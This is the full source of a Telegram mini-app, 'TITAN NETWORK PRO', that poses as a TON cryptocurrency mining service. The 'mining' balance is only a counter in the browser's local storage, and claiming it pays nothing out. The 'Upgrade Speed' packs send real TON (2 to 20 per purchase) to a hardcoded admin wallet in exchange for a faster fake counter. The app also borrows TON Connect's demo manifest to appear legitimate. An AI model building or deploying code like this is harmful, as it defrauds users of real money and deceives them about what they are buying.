<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>TITAN NETWORK PRO</title>
    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        :root { --blue: #007aff; --bg: #f8f9fa; --card: #ffffff; --green: #2ecc71; --gold: #f1c40f; }
        body { background: var(--bg); font-family: -apple-system, sans-serif; margin: 0; padding: 0; color: #333; overflow-x: hidden; }
        .page { display: none; height: calc(100vh - 75px); overflow-y: auto; padding-bottom: 30px; box-sizing: border-box; }
        .page.active { display: block; }

        /* Connect Button Custom */
        #ton-btn-container { padding: 15px; display: flex; justify-content: center; }

        .mining-area { text-align: center; margin-top: 10px; }
        .reactor { width: 170px; height: 170px; margin: 0 auto; border: 8px solid #eef6ff; border-radius: 50%; position: relative; display: flex; align-items: center; justify-content: center; box-shadow: 0 0 20px rgba(0,122,255,0.1); }
        .blades { width: 140px; height: 140px; background: conic-gradient(from 0deg, transparent 0%, var(--blue) 30%, transparent 40%, var(--blue) 70%, transparent 80%); border-radius: 50%; animation: spin 2s linear infinite; }
        @keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
        
        .balance-main { font-size: 36px; font-weight: 800; margin: 15px 0 5px 0; font-variant-numeric: tabular-nums; }
        .btn-action { background: var(--blue); color: white; border: none; width: 85%; padding: 16px; border-radius: 18px; font-size: 17px; font-weight: bold; cursor: pointer; }

        .boost-card { background: white; margin: 10px 15px; padding: 18px; border-radius: 20px; display: flex; align-items: center; justify-content: space-between; border: 1px solid #eee; }
        .btn-buy { background: var(--blue); color: white; border: none; padding: 12px 18px; border-radius: 12px; font-weight: bold; }

        .nav-bar { position: fixed; bottom: 0; width: 100%; height: 75px; background: white; display: flex; border-top: 1px solid #eee; z-index: 1000; }
        .nav-item { flex: 1; text-align: center; font-size: 10px; color: #999; display: flex; flex-direction: column; align-items: center; justify-content: center; }
        .nav-item.active { color: var(--blue); font-weight: bold; }
        .nav-item span { font-size: 22px; margin-bottom: 2px; }
    </style>
</head>
<body>

    <div id="homePage" class="page active">
        <div id="ton-btn-container"></div>
        <div class="mining-area">
            <div class="reactor"><div class="blades"></div><div class="reactor-core">⚡</div></div>
            <div class="balance-main" id="balanceDisplay">0.00000000</div>
            <div style="color:var(--blue); font-weight:bold; margin-bottom:15px;" id="speedDisplay">⚡ 0.012 PPH</div>
            <button class="btn-action" id="mineBtn" onclick="startMining()">🚀 Start Mining</button>
        </div>
    </div>

    <div id="walletPage" class="page">
        <h2 style="text-align:center; margin-top:20px;">Titan Wallet</h2>
        <div style="background:white; margin:15px; padding:30px; border-radius:25px; text-align:center; border:1px solid #eee;">
            <div style="font-size:45px; margin-bottom:10px;">👛</div>
            <div style="font-size:32px; font-weight:800; margin-bottom:10px;"><span id="mainWallet">0.0000</span> TON</div>
            <p style="color:#888; font-size:12px;">Mining Balance</p>
            <button onclick="saveToWallet()" style="background:var(--green); color:white; border:none; width:100%; padding:15px; border-radius:15px; font-weight:bold; margin-top:15px;">📥 Claim to Wallet</button>
        </div>
    </div>

    <div id="boostPage" class="page">
        <h2 style="text-align:center; margin-top:20px;">Upgrade Speed</h2>
        <div class="boost-card"><div><b>Starter Pack</b><br><small style="color:var(--green);">+0.50 PPH</small></div><button class="btn-buy" onclick="payWithTon(2, 0.50)">2 TON</button></div>
        <div class="boost-card"><div><b>Pro Miner</b><br><small style="color:var(--green);">+1.50 PPH</small></div><button class="btn-buy" onclick="payWithTon(5, 1.50)">5 TON</button></div>
        <div class="boost-card"><div><b>Industrial</b><br><small style="color:var(--green);">+4.00 PPH</small></div><button class="btn-buy" onclick="payWithTon(10, 4.00)">10 TON</button></div>
        <div class="boost-card" style="border:1px solid var(--gold);"><div><b style="color:var(--gold);">Titan Reactor</b><br><small style="color:var(--green);">+10.00 PPH</small></div><button class="btn-buy" style="background:var(--gold);" onclick="payWithTon(20, 10.00)">20 TON</button></div>
    </div>

    <div class="nav-bar">
        <div class="nav-item active" onclick="showPage('homePage')" id="nav-home"><span>🏠</span>Home</div>
        <div class="nav-item" onclick="showPage('walletPage')" id="nav-wallet"><span>👛</span>Wallet</div>
        <div class="nav-item" onclick="showPage('boostPage')" id="nav-boost"><span>🚀</span>Shop</div>
    </div>

    <script>
        // --- ADMIN SETTINGS ---
        const MY_WALLET = "UQC8qx530ORsKhEMwVVd_3UtPfjnAxKyA0DgTB1yR513oBOd";
        
        // --- TON CONNECT UI ---
        const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
            manifestUrl: 'https://raw.githubusercontent.com/ton-connect/demo-dapp/main/public/tonconnect-manifest.json',
            buttonRootId: 'ton-btn-container'
        });

        // --- GAME LOGIC ---
        let miningBalance = parseFloat(localStorage.getItem('miningBalance')) || 0;
        let walletBalance = parseFloat(localStorage.getItem('walletBalance')) || 0;
        let currentSpeed = parseFloat(localStorage.getItem('currentSpeed')) || 0.012;
        let isMining = localStorage.getItem('isMining') === 'true';
        let lastTime = localStorage.getItem('lastTime') || Date.now();

        window.onload = function() {
            if(isMining) {
                let diff = (Date.now() - lastTime) / 1000;
                miningBalance += (currentSpeed / 3600) * diff;
                startMining();
            }
            updateUI();
        };

        async function payWithTon(amount, speedAdd) {
            if (!tonConnectUI.connected) {
                Telegram.WebApp.showAlert("Lütfen önce cüzdanınızı bağlayın!");
                return;
            }

            const transaction = {
                validUntil: Math.floor(Date.now() / 1000) + 300,
                messages: [{ address: MY_WALLET, amount: (amount * 1000000000).toString() }]
            };

            try {
                Telegram.WebApp.HapticFeedback.impactOccurred('medium');
                await tonConnectUI.sendTransaction(transaction);
                currentSpeed += speedAdd;
                localStorage.setItem('currentSpeed', currentSpeed);
                updateUI();
                Telegram.WebApp.showAlert("Ödeme Onaylandı! Hızınız kalıcı olarak artırıldı. 🚀");
            } catch (e) {
                Telegram.WebApp.showAlert("İşlem iptal edildi.");
            }
        }

        function startMining() {
            isMining = true;
            localStorage.setItem('isMining', 'true');
            document.getElementById('mineBtn').innerText = "⛏️ Mining...";
            document.getElementById('mineBtn').style.background = "#2ecc71";
            
            setInterval(() => {
                miningBalance += (currentSpeed / 3600);
                document.getElementById('balanceDisplay').innerText = miningBalance.toFixed(8);
                localStorage.setItem('miningBalance', miningBalance);
                localStorage.setItem('lastTime', Date.now());
            }, 1000);
        }

        function saveToWallet() {
            if(miningBalance <= 0) return;
            walletBalance += miningBalance;
            miningBalance = 0;
            localStorage.setItem('walletBalance', walletBalance);
            updateUI();
            Telegram.WebApp.HapticFeedback.notificationOccurred('success');
        }

        function updateUI() {
            document.getElementById('balanceDisplay').innerText = miningBalance.toFixed(8);
            document.getElementById('mainWallet').innerText = walletBalance.toFixed(4);
            document.getElementById('speedDisplay').innerText = "⚡ " + currentSpeed.toFixed(3) + " PPH";
        }

        function showPage(id) {
            document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
            document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
            document.getElementById(id).classList.add('active');
            let navMap = {'homePage':'nav-home','walletPage':'nav-wallet','boostPage':'nav-boost'};
            document.getElementById(navMap[id]).classList.add('active');
        }

        Telegram.WebApp.ready();
        Telegram.WebApp.expand();
    </script>
</body>
</html>
